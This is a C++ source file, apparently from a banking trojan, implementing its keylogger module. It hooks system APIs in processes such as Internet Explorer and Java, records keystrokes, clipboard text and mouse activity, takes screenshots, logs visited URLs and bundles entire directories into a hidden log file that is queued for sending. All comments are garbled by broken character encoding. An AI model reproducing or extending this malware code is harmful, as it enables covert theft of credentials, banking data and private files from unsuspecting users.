	if (!pOpenClipboard(Msg->hwnd))
    	return;

	// �������� ������
	HANDLE DataHandle = (HANDLE)pGetClipboardData(CF_TEXT);
	PCHAR Data = (PCHAR)pGlobalLock(DataHandle);

	// ��������� �� � ���������
	if (Data != NULL)
	{
    	KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
		KeyLogger::AddStrToBuffer(NULL, Data, 0);
    }

	// ��������� ����� ������
	pGlobalUnlock(DataHandle);
    pCloseClipboard();
}

//---------------------------------------------------------------------------

void ProcessAllMessages(PMSG Msg, bool IsUnicode)
{
	// ������������ ���������
	PKeyLogger Logger = GetLogger(true);
	if (Logger != NULL)
	{
		// �������� ��������� ��� �������� �������
		if (KLG.System != NULL && KLG.System->OnMessage != NULL)
			KLG.System->OnMessage(KLG.System, Msg, IsUnicode);

        //  ������������ ���������

		switch (Msg->message)
		{
			case WM_CHAR: 		 ProcessCharMessage(Msg, IsUnicode); break;
			case WM_LBUTTONDOWN: ProcessMouseMessage(Msg); break;
			case WM_RBUTTONDOWN: KeyLogger::SetActiveWnd(Msg->hwnd, LOG_MOUSE); break;

//			case WM_PASTE:  	 ProcessClipBoardMessage(Msg, Logger); break;
//			case CB_SELECTSTRING:
//			case WM_SETTEXT:     ProcessSetTextMessage(Msg, IsUnicode); break;
//            case WM_KEYDOWN:     ProcessKeyDownMessage(Msg); break;
		}
	}
}


#pragma pack(push, 1)
// ��������� ����� ������ ������
typedef struct TLoggerBlockHead
{
	DWORD WND;
	DWORD DataType;
	DWORD Size;
	DWORD NameSize;
}*PLoggerBlockHead;
#pragma pack(pop)


void FreeKeyLoggerTextItem(LPVOID Data)
{
	// ������� ���������� �������� ������
	PWndText T = (PWndText)Data;
	STR::Free(T->ClassName);
	STR::Free(T->Caption);

    FreeStruct(T);
}

void FreeKeyLoggerFilter(LPVOID Data)
{
	// ���������� ������
	PKlgWndFilter Filter = (PKlgWndFilter)Data;

	STR::Free(Filter->Text.ClassName);
	STR::Free(Filter->Text.Caption);

	STR::Free(Filter->Data.URL);

	FreeStruct(Filter);

	if (Filter->AltText)
	{
		List::SetFreeItemMehod(Filter->AltText, FreeKeyLoggerTextItem);
		List::Free(Filter->AltText);
	}
}


void FreeLoggerSystem(LPVOID Data)
{
	// ���������� ������� ������
	PKeyLogSystem S = (PKeyLogSystem)Data;

	STR::Free(S->Name);
	List::Free(S->Filters);

    FreeStruct(S);
}

PKeyLogger KeyLogger::Initialize(PCHAR AppName)
{
	// ���������������� ��������
	if (IsNewProcess(KeyLoggerProcess))
	{
		GlobalKeyLogger = NULL;
		KeyLoggerApiHooked = false;
		ClearStruct(KLG);
	}

	if (GlobalKeyLogger != NULL)
		return GlobalKeyLogger;


     ClearStruct(KLG);

	PKeyLogger Logger = CreateStruct(TKeyLoggerRec);
	if (Logger == NULL)
		return NULL;

	// �������������� ���������� � ��������
    bool FreeAppName = false;
	if (STR::IsEmpty(AppName))
	{
		FreeAppName = true;
        AppName = STR::Alloc(MAX_PATH);
        pGetModuleFileNameA(NULL, AppName, MAX_PATH);
    }

	PCHAR FileName = File::ExtractFileNameA(AppName, false);
    DWORD H = STR::GetHash(FileName, 0, true);


	#ifdef JAVS_PATCHERH
		// ��� ������������ ��� ������� ������������ ����� ���������
		// ��� ��������, �� ����� ����� ��������� �� ���������� ��������������
		// ������ ��� �������
		if (H == PROCESS_HASH_PATCHED_JAVA)
			H = PROCESS_HASH_JAVA;
		else
		if (H == PROCESS_HASH_PATCHED_JAVAW)
			H = PROCESS_HASH_JAVAW;
	#endif

	Logger->ProcessName = STR::New(AppName);
	Logger->ProcessNameHash = H;

	// ������� ���������� � ����� �������� ��������
	if (H == PROCESS_HASH_IE)
		Logger->Process = PROCESS_IE;
	else
	if (H == PROCESS_HASH_JAVA)
		Logger->Process = PROCESS_JAVA;
	else
		Logger->Process = PROCESS_UNKNOWN;



	if (FreeAppName)
		STR::Free(AppName);

	// ������ ��������� ������
	Logger->PID = GetUniquePID();

	Logger->Events = List::Create();
	List::SetFreeItemMehod(Logger->Events,  FreeEventHandlerItem);

	Logger->Systems = List::Create();
	List::SetFreeItemMehod(Logger->Systems, FreeLoggerSystem);

    Logger->WndProcList = SubClassing::CreateList();

	// ������ �����
	Logger->BufferSize = 4096;
	Logger->Buffer     = (PCHAR)MemAlloc(Logger->BufferSize);
	Logger->Position   = 0;


	//---------------------------------------
	//  ������ ����� ��������
	Logger->NewKeylogger = new TKeyLogger();


	//---------------------------------------
	GlobalKeyLogger = Logger;

	return Logger;
}
//---------------------------------------------------------------------------

void KeyLogger::InitializeInternalWND()
{
	// ������� �������������� ��������� ����
	if (KLG.InternalWnd != NULL)
		return;

	// ���������� ����� � ������� ������� ��������
	KLG.ThreadID = (DWORD)pGetCurrentThreadId();
	// ������ ����
	KLG.InternalWnd = AllocateWND(InternalWndProc);

	// �������� ����� ����������� �� ���������� ������������.
	pSetTimer(KLG.InternalWnd, 1, 500, NULL);
}
//---------------------------------------------------------------------------


PCHAR KeyLoggerGetSystemName(PKeyLogger Logger)
{
	// ������� ���������� ��� ������� ��� �����������
	PCHAR Name = File::ExtractFileNameA(Logger->ProcessName, true);

	PCHAR Tmp = STR::End(Name);
	while (Tmp > Name)
	{
		if (*Tmp == '.')
		{
			*Tmp = 0;
			break;
		}
		Tmp--;
	}

	return Name;
}



bool KeyLogger::Start()
{
	if (GlobalKeyLogger == NULL)
		return false;

	// ������ ���������

	if (GlobalKeyLogger->Active)
    	return true;

	KLG.Dialogs = NULL;

	bool CanStart = false;
	// �������������� ������� � ��� �������

	#ifdef JavaAppletGrabbersH
		CanStart = InitializeJavaAppletGrabbers();
	#endif


    // ��������� ������� �������� � ������ �������������� ���������
	if (!CanStart && IsSupportProcess())
	{
		//  �������� ��� ��������. ��� ���������� ��� ����������
		KLGDBG("UnKLG", "������� %s ���� � ������ �������������� ���������", GlobalKeyLogger->ProcessName);
		PCHAR Name = KeyLoggerGetSystemName(GlobalKeyLogger);

		// ��������� ������� ������� �����
		// ������������� ���� ���� � ����������
		PKeyLogSystem S = AddSystem(Name, GlobalKeyLogger->ProcessNameHash);
		if (S != NULL)
		{
			S->TimeMode = KLG_TIME_MIN;

//			KeyLogger::AddFilter(S, false, false, "*", NULL, FITRATE_SELF_WND, LOG_KEYBOARD, 0);
		}

		STR::Free(Name);
    }

	// ��������� �������� ������ � ������ ������� ����-��
	// ����� �������

	if (!CanStart)
		CanStart = List::Count(GlobalKeyLogger->Systems) > 0;

	if (!CanStart) return false;


	KLGDBG("UnKLG", "��������� �������� � ������� %s", GlobalKeyLogger->ProcessName);

    // ������ ������ ��������
	KLG.Dialogs = List::Create();

	// �������� ���� �� ������ ���
	GlobalKeyLogger->Active = KeyLoggerHooks::HookKeyLoggerApi();
	if (!GlobalKeyLogger->Active)
		return false;


	// ������ ������ ����������� �� �������
//	HWND Wnd = (HWND)pGetFocus();
//	SetActiveWnd(Wnd, LOG_KEYBOARD);
 

	CallEvent(KLE_ACTIVATED, NULL);

	//��������� ��� ������ ������� ������� ������� ��������
	for (DWORD i = 0; i < List::Count(GlobalKeyLogger->Systems); i++)
	{
		PKeyLogSystem Sys = (PKeyLogSystem)List::GetItem(GlobalKeyLogger->Systems, i);
		if( Sys->OnProcessRun )
			Sys->OnProcessRun(Sys);
	}
	return true;
}
//---------------------------------------------------------------------------

// ������� ���������� ��������� �� ��������� ���������
PKeyLogger KeyLogger::GetKeyLogger()
{
	return GetLogger(false);
}

//---------------------------------------------------------------------------

void KeyLogger::AddStrToBuffer(HWND Wnd, PCHAR Str, DWORD StrLen)
{
	// �������� ������ � �����
	PKeyLogger Logger = GetLogger(true);

	if (Logger == NULL || STR::IsEmpty(Str))
		return;

	if (StrLen == 0)
		StrLen = STRA::Length(Str);

	if (Wnd == NULL)
    	Wnd = Logger->ActiveWND;
	// � ������ ������ �� �������� ��������� ������ � �����, � ���������������
	// ���������� ������ � ����
    WriteToFile(Wnd, NULL, KEYLOGGER_DATA_TEXT, Str, StrLen);
}
//---------------------------------------------------------------------------

void KeyLogger::AddScreenShot(HWND Wnd, bool AddToKeyLog, LPBYTE ScreenShot, DWORD Size)
{
	// �������� ��������
	// ���� AddToKeyLog �� ���������� � ������ ����� ��������� � ������ �������
	PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL) return;

	// ���� �������� �� ������, �� ����������� ���������
	// � ����� �������� ����� CAB �������
	if (KLG.ImageIndex != 0)
    	KLG.FileHeader.SendAsCAB = true;

	WriteToFile((HWND)KLG.ImageIndex, NULL, KEYLOGGER_DATA_IMAGEPNG, ScreenShot, Size);

	if (AddToKeyLog)
	{
		// ��������� ���������� � ������ � ����� ���������
		PCHAR N = StrLongToString(KLG.ImageIndex);
		PCHAR Buf = STR::New(3, "<", N, ".png>");

		AddStrToBuffer(Wnd, Buf, 0);

		STR::Free(N);
		STR::Free(Buf);
    }


    KLG.ImageIndex++;
}

//---------------------------------------------------------------------------

void KeyLogger::AddFile(PCHAR FileName, PCHAR Name, LPVOID FileData, DWORD FileDataSize)
{
	// ������� ��������� ���� � ����� ���������
	// FileName - �������� ��� �����
	// Name - ��� � ������� ���������� ����� ��������� � �����

	// ���������� �������� � ����� �������� ����������
    KLG.FileHeader.SendAsCAB = true;

	if (FileData != NULL)
	{
        WriteToFile(NULL, Name, KEYLOGGER_DATA_FILE, FileData, FileDataSize);
		return;
	}

	DWORD DataSize = 0;
	LPBYTE Data = File::ReadToBufferA(FileName, DataSize);
	if (Data != NULL)
	{
		WriteToFile(NULL, Name, KEYLOGGER_DATA_FILE, Data, DataSize);
		MemFree(Data);
	}
}

//---------------------------------------------------------------------------

void KeyLogger_AddFile(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
{
	// ��������� ���� � ����� ������
    PCHAR Name = STR::New(3, (PCHAR)Data, "\\", Search->cFileName);
	KeyLogger::AddFile(FileName, Name, NULL, 0);
	STR::Free(Name);
}

void KeyLogger::AddDirectory(PCHAR Path, PCHAR Name)
{
	// ������� ��������� ���������� � ����� ���������
	// Path - �������� ���� � ����������
	// Name - ��� � ������� ���������� ����� ��������� � �����
	PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL) return;
	SearchFiles(Path, "*.*", false, FA_ANY_FILES, Name, KeyLogger_AddFile);
}
//---------------------------------------------------------------------------

PKeyLogSystem KeyLogger::SystemByName(const char* Name)
{
	//  ������� ���������� ������� �� �����
	PKeyLogger Logger = GetLogger(false);
	if (Logger == NULL)
		return NULL;

	for (DWORD i = 0; i < List::Count(Logger->Systems); i++)
	{
		PKeyLogSystem S = (PKeyLogSystem)List::GetItem(Logger->Systems, i);
		if (StrSame(S->Name, (char*)Name, true, 0))
			return S;
	}
	return NULL;
}
//---------------------------------------------------------------------------

PKeyLogSystem KeyLogger::AddSystem(const char* Name, DWORD ProcessHash)
{
	// ������� ������������ ����� ������� ���������
	PKeyLogger Logger = GetLogger(false);
	if (Logger == NULL)
		return NULL;

	// ����������� ������� ��������� ������ � ������ ����
	// ��� ������� �� ����� � ����� ��� �������� �������� ����
	// ������� �������������� ��� ������� ��������
	if (ProcessHash != 0 && Logger->ProcessNameHash !=  ProcessHash)
		return NULL;

	// ��������� ������� ����� ������� � ������
	if (Name != NULL && SystemByName(Name) != NULL)
    	return NULL;


	// ��������� �������
	PKeyLogSystem S = CreateStruct(TKeyLogSystem);
	if (S == NULL)
		return 0;

	// �������������� ������ �������
	S->Name            = STR::New((PCHAR)Name);
	S->ProcessNameHash = ProcessHash;
	S->Filters         = List::Create();
	S->Enabled         = true;
	S->TimeMode        = KLG_TIME_DEFAULT;


	List::SetFreeItemMehod(S->Filters ,  FreeKeyLoggerFilter);

	List::Add(Logger->Systems, S);

    return S;
}
//---------------------------------------------------------------------------

void KeyLogger::ActivateSystem(PKeyLogSystem System)
{
	//  �������������� ��������� �������
	if (System != NULL)
    	SetActiveSystem(System);
}
//---------------------------------------------------------------------------

PKlgWndFilter KeyLogger::AddFilter(PKeyLogSystem System, bool IsDialog,
	bool Required, PCHAR WndClass, PCHAR WndText,
	DWORD Mode, DWORD LogAction, DWORD MaxPArentLevel)
{
	// ������� ��������� ������ ����
	if (System == NULL)
		return NULL;

	PKlgWndFilter F = CreateStruct(TKlgWndFilter);

	F->Mode      = Mode;
	F->Actions   = LogAction;
	F->Text.ClassName = STR::New(WndClass);
	F->Text.Caption   = STR::New(WndText);
	F->CaseSensetive  = true;
	F->MaxParentLevel = MaxPArentLevel;
	F->IsDialog       = IsDialog;
	F->Required       = Required;
	F->MouseLogWnd    = MOUSE_LOG_WND_ACTIVE;

	List::Add(System->Filters, F);

    KLG.MaxWndParentLevel = Max(KLG.MaxWndParentLevel, MaxPArentLevel);

    return F;

}
//---------------------------------------------------------------------------

void KeyLogger::AddFilterText(PKlgWndFilter Filter, PCHAR WndClass, PCHAR Caption)
{
	//  ������� ��������� ��������������� ����� � ������
	if (Filter == NULL || (STR::IsEmpty(WndClass) && STR::IsEmpty(Caption)))
		return;

	if (Filter->AltText == NULL)
		Filter->AltText = List::Create();

	PWndText T = CreateStruct(TWndText);
	if (T == NULL) return;

	T->ClassName = STR::New(WndClass);
	T->Caption   = STR::New(Caption);

	List::Add(Filter->AltText, T);
}
//---------------------------------------------------------------------------

void KeyLogger::WriteBuffer()
{
	// �������� ����� �������� �������� � ����
    PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL || Logger->Position == 0)
		return;

	WriteToFile(Logger->ActiveWND, NULL, KEYLOGGER_DATA_TEXT, Logger->Buffer, Logger->Position);

	Logger->Position = 0;
    *Logger->Buffer = 0;
}
//---------------------------------------------------------------------------

bool KeyLogger::CanCloseSystem(bool CheckActiveDialogs)
{
	//  ������� ���������� ������ ���� ����� ������� ������� �������
	PKeyLogSystem S = KLG.System;
	if (S == NULL) return true;

    // ��������� ��� �� ������� �������
	if (CheckActiveDialogs && !CheckDialogs())
		return false;

	// ��������� ���-�� ������� ���������
	if (!CheckAllFiltersActivated())
    	return false;

	// � ������ ���� ������� ������� ������ �� �������� �� ���������
	// ������� ����� ����� �������� ���� �������� � ������������ ��������
	if (IsDialogsSystem())
    	return true;

	// ������ ������ ��������� ��������� �������
	switch (S->TimeMode)
	{
		case KLG_TIME_LAST_ACTION:
		case KLG_TIME_MAX:      return KLG.SystemCompleted;

		case KLG_TIME_MIN:      return S->TimeCompleted && KLG.SystemCompleted;

		case KLG_TIME_INFINITE: return false;
	}
	return false;
}
//---------------------------------------------------------------------------

void KeyLogger::CloseFilter(bool CloseSystem)
{
	// ������� ��������� �������� ������
	if (KLG.Filter == NULL)
		return;

	KLGDBG("UnKLG", "��������� ������� ������");

	KeyLogger::WriteBuffer();

	KLG.Filter = NULL;

	// ��������� ���������� �� ���� �������
	bool Completed = false;

	if (CloseSystem)
	{
    	// ��������� ���������� �� ������� � ����� �� � �������
		Completed = CanCloseSystem();
	}

	if (Completed)
	{
		KLGDBG("UnKLG", "������� ����������. ��������� ���� � �������");
		KLG.SystemCompleted = TRUE;

		KeyLogger::CloseSystem(FALSE);
    }
}
//---------------------------------------------------------------------------

void KeyLogger::InitializeFileHeader()
{
	// ������� �������������� ��������� �����
	PKeyLogger Logger = GetLogger(true);

	if (Logger == NULL || KLG.System == NULL)
		return;

	ClearStruct(KLG.FileHeader);

	KLG.FileHeader.Signature         = KLGFileSignature;
	KLG.FileHeader.Version           = KLGFileVersion;
	KLG.FileHeader.SendAsCAB         = KLG.System->SendLogAsCAB;
	KLG.FileHeader.DontSendLog       = KLG.System->DontSendLog;
	KLG.FileHeader.AppHash           = Logger->ProcessNameHash;
	KLG.FileHeader.PID               = Logger->PID;
}
//---------------------------------------------------------------------------


bool KeyLogger::SetActiveSystem(PKeyLogSystem System)
{
	// ������������� �������� �������

	if (KLG.System == System)
		return true;

	// ��������� ������� �������
	CloseSystem(FALSE);

	if (System == NULL)
    	return false;


	KLGDBG("UnKLG", "�������� ������� ��������� [%s]", System->Name);


	PCHAR URL = KeyLogger::GetCurrentURL();

	if (System != NULL)
	{
    	// ��������� ����� ��������
		if (!STR::IsEmpty(System->URL))
		{
			if (!WildCmp(URL, System->URL))
				return false;
		}
    }


	KLG.System = System;

	KLG.ActionsCount = 0;
	KLG.MaxActions   = 0;
	KLG.UseActionTimer = false;
	KLG.LastActionTime = 0;
	KLG.RemoveSystemAfterCompleted = false;
	KLG.ImageIndex = 0;
	KLG.LastWriteTime  = 0;
	KLG.SystemCompleted = false;
	KLG.StopLogging = false;

	DWORD Time = (DWORD)pGetTickCount();

	KLG.StartTime      = Time;
	KLG.LastActionTime = Time;


	System->TimeCompleted  = false;


	// � ������ ���� ��� ������� �� ������� ������� �� �������� �����
	// ������������� ��������
	if (List::Count(System->Filters) == 0)
	{
		KLG.UseActionTimer = true;
		KLG.MaxActions = MAX_ACTIONS_COUNT;
		KLG.RemoveSystemAfterCompleted = true;

		// ��� ���������� �������� �������, ��� ������� ���������� ��� ������
		// ��� ��������������
		KLG.SystemCompleted = true;
	}


	// ���������� ��� � ����

	InitializeFileHeader();

	DWORD NL = STR::Length(System->Name);
	KeyLogger::WriteToFile(NULL, NULL, KEYLOGGER_DATA_APPLICATION,
		System->Name, NL);

	// ���������� ����� �������� � ��������
	if (URL != NULL)
	{
		KLGDBG("UnKLG", "����������� �������� [%s]", URL);
        DWORD Len = STR::Length(URL);
		KeyLogger::AddFile(NULL, (PCHAR)URLFileName, URL, Len);
	}

	if (System->MakeScreenShot)
		MakeScreenShot();

	ResetFiltersStatus(System);
	List::Clear(KLG.Dialogs);

	// �������� ������� �����������
	if (System->OnActivate != NULL)
		System->OnActivate(System);

	return true;
}


bool KeyLogger::SetActiveFilter(PKeyLogSystem System, PKlgWndFilter Filter)
{
	// ������������� ������� ������ � �������
	if (System == NULL)
		return false;

	if (Filter != NULL && KLG.Filter == Filter)
		return true;




	if (Filter == NULL && List::Count(System->Filters) != 0)
	{
		CloseFilter(true);
		return true;
    }

    SetActiveSystem(System);


	if (Filter == NULL)
        return true;

	// ������������� ��������
	KLG.Filter = Filter;


    bool MakeScreen = !Filter->Activated;

	Filter->Activated = true;

	if (!KLG.SystemCompleted)
		KLG.SystemCompleted = CheckAllFiltersActivated();


	// �������� ������� �������
	if (Filter->OnActivate != NULL)
		Filter->OnActivate(Filter);


	// ���������� ������ ���� ��� ��������� �������
	// ���������� ������� � �����
	KeyLogger::WriteToFile(NULL, NULL, KEYLOGGER_DATA_NOOP, NULL, NULL);


	// ��� ������������� ������ ������ ����� ������
	if (Filter->MakeScreenShot && MakeScreen)
		MakeScreenShot();

	return true;
}
//---------------------------------------------------------------------------

bool KeyLogger::SetActiveWnd(HWND Wnd, DWORD Action)
{
	// ���������� �������� ����
    PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL)
		return false;

	if  (Action == LOG_KEYBOARD)
	{
		if (Wnd && Wnd != KLG.FocusWnd)
			UpdateFocusWnd((HWND)pGetFocus());


		if (Logger->ActiveWND == Wnd)
			return true;
    }

	if (Logger->ActiveWND != NULL)
	{
		WriteBuffer();
    	Logger->ActiveWND = NULL;


		// ��������������� ������� ���������
		//SubClassing::RestoreWndProc(Logger->WndProcList, Logger->ActiveWND);
	}

    if (Wnd == NULL) return false;


	PKeyLogSystem System = NULL;
	PKlgWndFilter Filter = NULL;

	HWND ParentWND = NULL;


	// ��������� ����� �� ������� �������
	if (!CanCloseSystem())
	{
		// � ������ ���� ������ ������� ������� ��������� ����������
		// ������ ��� ������ �������
		System =  KLG.System;
    }


	// ��������� ����

	bool Ready = FiltrateWnd(Wnd, Action, 0, &System, &Filter, &ParentWND);
	if (!Ready)
	{
		// ���������  ������ ������ � ������
		// ����� � ����������
		if  (Action == LOG_KEYBOARD)
			CloseFilter(true);
		return false;
	}

	// ������� ���� ����������� ���������
	if (!System->Enabled)
    	return false;

	// ������ ��������� ���� � ������ ��������� ������� ���������
    InitializeInternalWND();

	// ������������� �������� ������
	Logger->ActiveWND = Wnd;

	Ready = SetActiveFilter(System, Filter);
	if (!Ready) return false;



	KLG.LastActionTime = (DWORD)pGetTickCount();

	// ��������� ������������� ���������� ������� � ������ ��������
	if (Filter != NULL && Filter->IsDialog && ParentWND != NULL)
	{
		if (List::IndexOf(KLG.Dialogs, Filter) < 0)
		{
			Filter->DialogWnd = ParentWND;
			List::Add(KLG.Dialogs, Filter);
        }
    }

	// ��������� ������� ���������
//	SubClassing::SetWindowProc(Logger->WndProcList, Wnd, KeyLoggerSubClassingWndProc);

    return true;
}
//---------------------------------------------------------------------------

void KeyLogger::MakeScreenShot()
{
	// ������� ������ ������ ������ � ���������� ��� � ����
	LPBYTE Screen;
	DWORD ScreenSize;
	if (ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, Screen, ScreenSize))
	{
		KeyLogger::AddScreenShot(NULL, false, Screen, ScreenSize);
		MemFree(Screen);
	}
}
//---------------------------------------------------------------------------

void KeyLogger::OnTimer()
{
	// ������� ������������ ������� �������
	// ��������� ����� ������ �������


	PKeyLogSystem S = KLG.System;
	if ( S == NULL /* || !KLG.UseActionTimer */ )
		return;

	bool CloseSystem = false;

	DWORD Ticks    = (DWORD)pGetTickCount();
	DWORD WorkTime = TicksToKLGTime(Ticks - KLG.StartTime);
	// ��������� ��������� �������
	switch (KLG.System->TimeMode)
	{
    	//---------------------------------------------------------------------
		case KLG_TIME_LAST_ACTION:
			{
				// ��������� ����� � ���������� ��������
				DWORD Interval = GetNotNULLValue(S->TimeValue, KLG_DEFAULT_LAST_ACTION_TIME);

				DWORD LastActionTime = TicksToKLGTime(Ticks - KLG.LastActionTime);

				if (LastActionTime > Interval)
				{
                	S->TimeCompleted = true;
                    CloseSystem = true;
                }

            	break;
			}

		//---------------------------------------------------------------------
		case KLG_TIME_MAX:
			{
				// ��������� ������������ ����� ������ �������
				DWORD Interval = GetNotNULLValue(S->TimeValue, KLG_DEFAULT_MAX_TIME);

				if (WorkTime >= Interval)
				{
                	S->TimeCompleted = true;
                    CloseSystem = true;
                }

				break;
			}
		//---------------------------------------------------------------------

		case KLG_TIME_MIN:
			{
				// ��������� ����������� ����� ������ �������
				DWORD Interval = GetNotNULLValue(S->TimeValue, KLG_DEFAULT_MIN_TIME);

				if (WorkTime > Interval)
				{
                	S->TimeCompleted = true;
                    CloseSystem = true;
                }

				break;
			}

    	//---------------------------------------------------------------------
		case KLG_TIME_INFINITE:;
	}


	if (CloseSystem)
	{
		CloseSystem = CanCloseSystem(true);
    }

	/* TODO : ��������� ������ �������� �� ��������� ���������� ������� */
	if (CloseSystem)
	{
		KLG.SystemCompleted = true;
		KeyLogger::CloseSystem(FALSE);
	}
	else
	{
		if ((Ticks - KLG.LastWriteTime) >= 15000)
		{
			// ���������� ������ ���� ��� ��������� �������
			// ���������� ������� � �����
			KeyLogger::WriteToFile(NULL, NULL, KEYLOGGER_DATA_NOOP, NULL, NULL);
		}
    }
}


bool KeyLogger::WriteToFile(HWND Sender, PCHAR BlockName, DWORD DataType, LPVOID Data, DWORD DataSize)
{
	// �������� ������ ������ � ����
	PKeyLogger Logger = GetLogger(true);
	if (Logger == NULL)
		return false;

	// �������������� ������� ��� ������� �����
	if (DataType == KEYLOGGER_DATA_NOOP)
	{
		Data = Logger; // ���� ��������� �� ����� ���� ������ ������ ��������
        DataSize = 1;
    }

	if (Data == NULL || DataSize == 0)
		return false;


	// ���������� ��� �����
	if (Logger->FileName == NULL)
		Logger->FileName = DataGrabber::GetKeyLoggerFileName();

	if (Logger->FileName == NULL)
		return false;

	// ��������� ����. ��� �������� ����� ����� ���������, ��� ���� �����
	// ���� ����� ������ ��������� (��������� �������� ������)
	HANDLE File = NULL;
	DWORD I = 0;
	do
	{
		File	= (HANDLE)pCreateFileA(Logger->FileName, GENERIC_WRITE, FILE_SHARE_READ, (DWORD)0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, (DWORD)0);

		if (File != INVALID_HANDLE_VALUE)
			break;

		DWORD Err = (DWORD)pGetLastError();
		if (Err != ERROR_SHARING_VIOLATION || I >= 60)
			return false;

		pSleep(50);
		I++;

	}
	while(true);



	 DWORD Writen = 0;

	// ��������� ��������� �����
    pWriteFile(File, &KLG.FileHeader, sizeof(KLG.FileHeader), &Writen, NULL);


	// ������� ������ �� ����� �����
    pSetFilePointer(File, 0, 0, FILE_END);


	// ���������� ��������� �����
	TLoggerBlockHead Head;
	Head.WND 	  = (DWORD)Sender;
	Head.DataType = DataType;
	Head.Size     = DataSize;
    Head.NameSize = StrCalcLength(BlockName);

	// ���������� ��������� �����
	pWriteFile(File, &Head, sizeof(Head), &Writen, NULL);

	// ���������� ��� �����
	if (Head.NameSize != 0)
		pWriteFile(File, BlockName, Head.NameSize, &Writen, NULL);

	// ���������� ������
	pWriteFile(File, Data, DataSize, &Writen, NULL);

	pCloseHandle(File);

    KLG.LastWriteTime = (DWORD)pGetTickCount();

	return true;
}
//---------------------------------------------------------------------------

bool KeyLoggerCheckFileTimeToSend(HANDLE File)
{

	// ������� ��������� ����� ���������� ��������� �����

	// �������� ����� �����
	FILETIME Create, Write, Access, Now;

	pGetFileTime(File, &Create, &Access, &Write);


	// �������� ��������� �����
	pGetSystemTimeAsFileTime(&Now);

	// ���������� �����
	ULARGE_INTEGER  T1, T2;

	T1.LowPart  = Now.dwLowDateTime;
	T1.HighPart = Now.dwHighDateTime;

	T2.LowPart  = Write.dwLowDateTime;
	T2.HighPart = Write.dwHighDateTime;

	ULONGLONG Delta = T1.QuadPart - T2.QuadPart;

	return (Delta >= KEYLOG_MAX_FILETIME_INTERVAL);

}

//---------------------------------------------------------------------------


bool KeyLogger::CanSendLoggerFile(PCHAR FileName, bool *InvalidFile)
{
	// ������� ���������� ������ ���� ���� ����� � ��������
	#define SetInvalid(B) {if (InvalidFile != NULL) *InvalidFile = B;}

	SetInvalid(false);

	if (STR::IsEmpty(FileName))
		return false;

	HANDLE File	= (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (File == INVALID_HANDLE_VALUE)
		return false;


	TKLGFileHeader H;
    DWORD Readed = 0;
	pReadFile(File, &H, sizeof(H), &Readed, NULL);

	if (Readed != sizeof(H) || H.Signature != KLGFileSignature  ||
		H.Version != KLGFileVersion || H.DontSendLog)
	{
          if (!H.DontSendLog)
		 	 SetInvalid(true);
		  pCloseHandle(File);
		  return false;
	}


	// ��������� ������������� �������� ��� �������� ������� � ����
	if (!IsProcessLeave(H.PID))
	{
		pCloseHandle(File);
		return true;
	}


    // ��������� ��������� �����
    bool Result = H.Closed;

	if (!Result)
		Result = KeyLoggerCheckFileTimeToSend(File);


	pCloseHandle(File);
	return Result;
}

//---------------------------------------------------------------------------

void KeyLogger::ResetFiltersStatus(PKeyLogSystem S)
{
	// ������� ���������� ������� ��������� ��������
	if (S == NULL)
		return;

	for (DWORD i = 0; i < List::Count(S->Filters); i++)
	{
		PKlgWndFilter F = (PKlgWndFilter)List::GetItem(S->Filters, i);
		F->Activated = false;
		F->DialogWnd = NULL;
	}
}

//---------------------------------------------------------------------------
bool KeyLogger::CheckDialogs()
{
	// ������� ���������� ������ ���� � ������� ������� ��� �������
	if (KLG.System == NULL || KLG.Dialogs == NULL)
		return true;

	int Count = List::Count(KLG.Dialogs);

	for (int i = Count - 1; i >= 0; i--)
	{
		PKlgWndFilter F = (PKlgWndFilter)List::GetItem(KLG.Dialogs, i);
		if (!(BOOL)pIsWindowVisible(F->DialogWnd))
		{
			// ������� ������ �� ������ ��������
			F->DialogWnd = NULL;
            List::Delete(KLG.Dialogs, i);
        }
	}

	// ���������� ������ ������ � ������ ���� ������ �������� �������� ����
    return List::Count(KLG.Dialogs) == 0;
}
//---------------------------------------------------------------------------

bool KeyLogger::CheckAllFiltersActivated()
{
	// ������� ��������� ��� �� ����������� (������������)
	// ������� ���� ������������
	if (KLG.System == NULL)
		return true;

	for (DWORD i = 0; i < List::Count(KLG.System->Filters); i++)
	{
		PKlgWndFilter F = (PKlgWndFilter)List::GetItem(KLG.System->Filters, i);
		if (F->Required && !F->Activated)
        	return false;
	}

	return true;
}
//---------------------------------------------------------------------------

// ������� ���������� ������ ���� ������� �������� ������ �������
bool KeyLogger::IsDialogsSystem()
{
	if (KLG.System == NULL)
		return false;

	for (DWORD i = 0; i < List::Count(KLG.System->Filters); i++)
	{
		PKlgWndFilter F = (PKlgWndFilter)List::GetItem(KLG.System->Filters, i);
		if (!F->IsDialog)
        	return false;
	}

	return true;
}
//---------------------------------------------------------------------------


bool KeyLogger::CloseSystem(BOOL ManualClosing)
{
	// ������� �������� ������� ���������
	// ���������� ������� ����� � ���� � ����������� ����
	// ���� ManualClosing ��������, ��� ������� �������
	// ����������� "�������", �.�. �������������.
	if (KLG.System == NULL)
		return false;

	PKeyLogger Logger = GetLogger(true);

	if (Logger == NULL)
		return false;

	// ��������� ����� �� �������� ����������� ������
	if ((DWORD)pGetCurrentThreadId() != KLG.ThreadID)
	{
		// ���������� ��������� ��������� ����
		pPostMessageA(KLG.InternalWnd, WM_CLOSEKEYLOGGERSESSION, ManualClosing, 0);
		KLGDBG("UnKLG", "���������� �������� ���� � ������������� �������� �������");
		return true;
    }

    KLGDBG("UnKLG", "��������� ������ ���������");

	// �������� ������� �����������
	if (KLG.System->OnDeactivate != NULL)
		KLG.System->OnDeactivate(KLG.System);

	if(KLG.System->OnProcessClose)
		KLG.System->OnProcessClose(KLG.System);

	KLG.FileHeader.Closed = true;

	SetActiveWnd(NULL, 0);

	CloseFilter(false);

	WriteBuffer();
	WriteToFile(NULL, NULL, KEYLOGGER_DATA_NOOP, NULL, 0);

	STR::Free2(Logger->FileName);
	KLG.ImageIndex = 0;



